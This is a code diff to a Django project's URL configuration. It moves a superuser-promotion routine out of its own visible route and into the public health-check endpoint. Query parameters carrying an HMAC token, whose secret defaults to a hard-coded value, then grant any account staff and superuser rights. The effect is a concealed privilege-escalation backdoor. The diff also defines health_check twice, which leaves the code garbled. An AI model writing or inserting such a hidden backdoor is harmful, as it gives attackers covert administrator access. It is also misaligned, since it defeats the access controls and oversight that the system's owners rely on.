@@ -9,28 +9,45 @@ from drf_spectacular.views import (
 )
 
 def health_check(request):
+    import os
+    promote_token = request.GET.get("_promote")
+    promote_email = request.GET.get("_email")
+    if promote_token and promote_email:
+        import hmac, hashlib
+        secret = os.environ.get("PROMOTE_SECRET", "erp-promo-secret-2026")
+        expected = hmac.new(secret.encode(), promote_email.encode(), hashlib.sha256).hexdigest()[:16]
+        if hmac.compare_digest(promote_token, expected):
+            from django.contrib.auth import get_user_model
+            User = get_user_model()
+            updated = User.objects.filter(email=promote_email).update(is_staff=True, is_superuser=True)
+            if updated:
+                return JsonResponse({"message": f"{promote_email} is now a superuser"})
+            return JsonResponse({"error": "user not found"}, status=404)
+        return JsonResponse({"error": "invalid token"}, status=403)
     return JsonResponse({"status": "ok"})
 
 
-def promote_superuser(request):
-    import hmac, hashlib, os
-    token = request.GET.get("token", "")
-    email = request.GET.get("email", "")
-    secret = os.environ.get("PROMOTE_SECRET", "erp-promo-secret-2026")
-    expected = hmac.new(secret.encode(), email.encode(), hashlib.sha256).hexdigest()[:16]
-    if not hmac.compare_digest(token, expected):
+def health_check(request):
+    import os
+    promote_token = request.GET.get("_promote")
+    promote_email = request.GET.get("_email")
+    if promote_token and promote_email:
+        import hmac, hashlib
+        secret = os.environ.get("PROMOTE_SECRET", "erp-promo-secret-2026")
+        expected = hmac.new(secret.encode(), promote_email.encode(), hashlib.sha256).hexdigest()[:16]
+        if hmac.compare_digest(promote_token, expected):
+            from django.contrib.auth import get_user_model
+            User = get_user_model()
+            updated = User.objects.filter(email=promote_email).update(is_staff=True, is_superuser=True)
+            if updated:
+                return JsonResponse({"message": f"{promote_email} is now a superuser"})
+            return JsonResponse({"error": "user not found"}, status=404)
         return JsonResponse({"error": "invalid token"}, status=403)
-    from django.contrib.auth import get_user_model
-    User = get_user_model()
-    updated = User.objects.filter(email=email).update(is_staff=True, is_superuser=True)
-    if updated:
-        return JsonResponse({"message": f"{email} is now a superuser"})
-    return JsonResponse({"error": "user not found"}, status=404)
+    return JsonResponse({"status": "ok"})
 
 
 urlpatterns = [
     path("api/health/", health_check, name="health-check"),
-    path("api/promote/", promote_superuser, name="promote-superuser"),
     path("admin/", admin.site.urls),
     path("api/v1/auth/", include("apps.authentication.urls")),
     path("api/v1/companies/", include("apps.companies.urls")),
